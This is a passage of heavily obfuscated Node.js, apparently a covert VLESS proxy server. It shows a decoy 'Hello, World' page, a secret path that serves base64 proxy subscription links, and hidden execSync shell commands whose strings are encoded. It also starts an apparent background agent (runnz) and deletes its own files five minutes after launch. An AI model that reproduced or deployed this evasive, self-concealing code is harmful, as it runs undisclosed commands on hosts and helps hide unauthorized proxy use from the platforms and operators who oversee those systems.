_0x13732c=_0x4d27b8;_0xa8cf82?(log(_0x13732c(0x206),_0x13732c(0x1fa)+_0xa8cf82[_0x13732c(0x23a)]),_0x438c05(_0xa8cf82)):_0x4f1450();});});}['_startDownstreamResponse'](){const _0x1dd102=_0x465188;if(!this[_0x1dd102(0x2c6)]||!this[_0x1dd102(0x2b0)])return;try{!this[_0x1dd102(0x2ad)]&&(this['currentStreamRes'][_0x1dd102(0x25b)](this['responseHeader']),this[_0x1dd102(0x2ad)]=!![]),this[_0x1dd102(0x223)][_0x1dd102(0x2a1)](this['currentStreamRes']),this[_0x1dd102(0x223)]['on'](_0x1dd102(0x2cf),()=>{const _0x4cf6ef=_0x1dd102;!this[_0x4cf6ef(0x2c6)][_0x4cf6ef(0x289)]&&this[_0x4cf6ef(0x2c6)][_0x4cf6ef(0x2cf)]();}),this[_0x1dd102(0x223)]['on'](_0x1dd102(0x206),_0x84561c=>{const _0x6e2ee6=_0x1dd102;log('error',_0x6e2ee6(0x2c9)+_0x84561c[_0x6e2ee6(0x23a)]),!this[_0x6e2ee6(0x2c6)]['writableEnded']&&this[_0x6e2ee6(0x2c6)][_0x6e2ee6(0x2cf)]();});}catch(_0x56b838){log('error',_0x1dd102(0x27b)+_0x56b838[_0x1dd102(0x23a)]),this['cleanup']();}}[_0x465188(0x2c1)](){const _0x856850=_0x465188;!this[_0x856850(0x29e)]&&(this['cleaned']=!![],log('debug','Cleaning\x20up\x20session\x20'+this[_0x856850(0x1f3)]),this['remote']&&(this['remote'][_0x856850(0x293)](),this[_0x856850(0x223)]=null),this[_0x856850(0x2a8)]=![],this[_0x856850(0x2ad)]=![]);}}const metaInfo=execSync(_0x465188(0x2a2),{'encoding':'utf-8'}),ISP=metaInfo[_0x465188(0x220)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync(_0x465188(0x24e),{'encoding':'utf-8'})[_0x465188(0x220)]();}catch(_0x1e1f66){try{IP='['+execSync(_0x465188(0x272),{'encoding':_0x465188(0x26b)})['trim']()+']';}catch(_0x5ae9dd){log(_0x465188(0x206),_0x465188(0x240),_0x5ae9dd[_0x465188(0x23a)]),IP=_0x465188(0x2cd);}}const server=http[_0x465188(0x28d)]((_0x920f22,_0x340320)=>{const _0x2c8b60=_0x465188,_0x352459={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x2c8b60(0x2c0),'Cache-Control':_0x2c8b60(0x23c),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x920f22[_0x2c8b60(0x2bf)]==='/'){_0x340320[_0x2c8b60(0x2ba)](0xc8,{'Content-Type':_0x2c8b60(0x219)}),_0x340320[_0x2c8b60(0x2cf)]('Hello,\x20World\x0a');return;}if(_0x920f22[_0x2c8b60(0x2bf)]==='/'+SUB_PATH){const _0x29c9df='vless://'+UUID+'@'+IP+':443?encryption=none&security=tls&sni='+IP+_0x2c8b60(0x232)+IP+_0x2c8b60(0x258)+SETTINGS[_0x2c8b60(0x2c7)]+_0x2c8b60(0x217)+NAME+'-'+ISP,_0x2de794=Buffer[_0x2c8b60(0x285)](_0x29c9df)['toString']('base64');_0x340320[_0x2c8b60(0x2ba)](0xc8,{'Content-Type':_0x2c8b60(0x219)}),_0x340320[_0x2c8b60(0x2cf)](_0x2de794+'\x0a');return;}const _0x408f66=_0x920f22[_0x2c8b60(0x2bf)]['match'](new RegExp(XPATH+_0x2c8b60(0x2a9)));if(!_0x408f66){_0x340320['writeHead'](0x194),_0x340320['end']();return;}const _0x1e5b9a=_0x408f66[0x1],_0x4a215c=_0x408f66[0x2]?parseInt(_0x408f66[0x2]):null;if(_0x920f22[_0x2c8b60(0x2ca)]===_0x2c8b60(0x23e)&&!_0x4a215c){_0x352459[_0x2c8b60(0x278)]=_0x2c8b60(0x294),_0x352459[_0x2c8b60(0x23f)]=_0x2c8b60(0x233);let _0x230227=sessions[_0x2c8b60(0x225)](_0x1e5b9a);!_0x230227&&(_0x230227=new Session(_0x1e5b9a),sessions[_0x2c8b60(0x235)](_0x1e5b9a,_0x230227),log('info',_0x2c8b60(0x29a)+_0x1e5b9a));_0x230227[_0x2c8b60(0x2b3)]=!![];!_0x230227[_0x2c8b60(0x1f2)](_0x340320,_0x352459)&&(log('error',_0x2c8b60(0x1ef)+_0x1e5b9a),!_0x340320[_0x2c8b60(0x262)]&&(_0x340320['writeHead'](0x1f4),_0x340320[_0x2c8b60(0x2cf)]()),_0x230227[_0x2c8b60(0x2c1)](),sessions[_0x2c8b60(0x273)](_0x1e5b9a));return;}if(_0x920f22['method']===_0x2c8b60(0x21f)&&_0x4a215c!==null){let _0x52b05e=sessions[_0x2c8b60(0x225)](_0x1e5b9a);!_0x52b05e&&(_0x52b05e=new Session(_0x1e5b9a),sessions[_0x2c8b60(0x235)](_0x1e5b9a,_0x52b05e),log(_0x2c8b60(0x263),_0x2c8b60(0x247)+_0x1e5b9a),setTimeout(()=>{const _0x62c29f=_0x2c8b60,_0x19d1b0=sessions[_0x62c29f(0x225)](_0x1e5b9a);_0x19d1b0&&!_0x19d1b0['downstreamStarted']&&(log(_0x62c29f(0x2a6),_0x62c29f(0x218)+_0x1e5b9a+_0x62c29f(0x1ff)),_0x19d1b0[_0x62c29f(0x2c1)](),sessions[_0x62c29f(0x273)](_0x1e5b9a));},SETTINGS['SESSION_TIMEOUT']));let _0x37826e=[],_0x4282c9=0x0,_0x655b07=![];_0x920f22['on']('data',_0x463cf0=>{const _0x4c3337=_0x2c8b60;_0x4282c9+=_0x463cf0[_0x4c3337(0x234)];if(_0x4282c9>SETTINGS[_0x4c3337(0x1f4)]){!_0x655b07&&(_0x340320[_0x4c3337(0x2ba)](0x19d),_0x340320[_0x4c3337(0x2cf)](),_0x655b07=!![]);return;}_0x37826e[_0x4c3337(0x292)](_0x463cf0);}),_0x920f22['on'](_0x2c8b60(0x2cf),async()=>{const _0x58dfb3=_0x2c8b60;if(_0x655b07)return;try{const _0x33227f=Buffer[_0x58dfb3(0x277)](_0x37826e);log('info',_0x58dfb3(0x2be)+_0x4a215c+_0x58dfb3(0x298)+_0x33227f[_0x58dfb3(0x234)]),await _0x52b05e[_0x58dfb3(0x20f)](_0x4a215c,_0x33227f),!_0x655b07&&(_0x340320[_0x58dfb3(0x2ba)](0xc8,_0x352459),_0x655b07=!![]),_0x340320['end']();}catch(_0x530087){log('error',_0x58dfb3(0x274)+_0x530087['message']),_0x52b05e[_0x58dfb3(0x2c1)](),sessions[_0x58dfb3(0x273)](_0x1e5b9a),!_0x655b07&&(_0x340320[_0x58dfb3(0x2ba)](0x1f4),_0x655b07=!![]),_0x340320[_0x58dfb3(0x2cf)]();}});return;}_0x340320[_0x2c8b60(0x2ba)](0x194),_0x340320[_0x2c8b60(0x2cf)]();});server['on']('secureConnection',_0x466e8f=>{const _0x10c6c4=_0x465188;log(_0x10c6c4(0x215),_0x10c6c4(0x20b)+(_0x466e8f['alpnProtocol']||_0x10c6c4(0x2bc)));});function generatePadding(_0xb1f3c2,_0x28e23b){const _0x4354dc=_0x465188,_0x2f440a=_0xb1f3c2+Math['floor'](Math[_0x4354dc(0x2b5)]()*(_0x28e23b-_0xb1f3c2));return Buffer['from'](Array(_0x2f440a)[_0x4354dc(0x22c)]('X')['join'](''))[_0x4354dc(0x2d0)]('base64');}server[_0x465188(0x1fe)]=0x975e0,server[_0x465188(0x25d)]=0x98968,server['on']('error',_0x5cd249=>{const _0xc0be9b=_0x465188;log(_0xc0be9b(0x206),'Server\x20error:\x20'+_0x5cd249[_0xc0be9b(0x23a)]);});const delFiles=()=>{const _0x1d2915=_0x465188;[_0x1d2915(0x20a),_0x1d2915(0x2bb)][_0x1d2915(0x267)](_0x37d1eb=>fs[_0x1d2915(0x2af)](_0x37d1eb,()=>{}));};server['listen'](PORT,()=>{const _0x15c4ae=_0x465188;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console['log'](_0x15c4ae(0x28e)+PORT),log(_0x15c4ae(0x263),'================================='),log(_0x15c4ae(0x263),_0x15c4ae(0x2bd)+SETTINGS[_0x15c4ae(0x252)]),log('info','Max\x20buffered\x20posts:\x20'+SETTINGS['MAX_BUFFERED_POSTS']),log('info','Max\x20POST\x20size:\x20'+SETTINGS['MAX_POST_SIZE']+'KB'),log(_0x15c4ae(0x263),'Max\x20buffer\x20size:\x20'+SETTINGS[_0x15c4ae(0x204)]+'KB'),log(_0x15c4ae(0x263),_0x15c4ae(0x271)+SETTINGS[_0x15c4ae(0x1f6)]+_0x15c4ae(0x275)),log('info','=================================');});
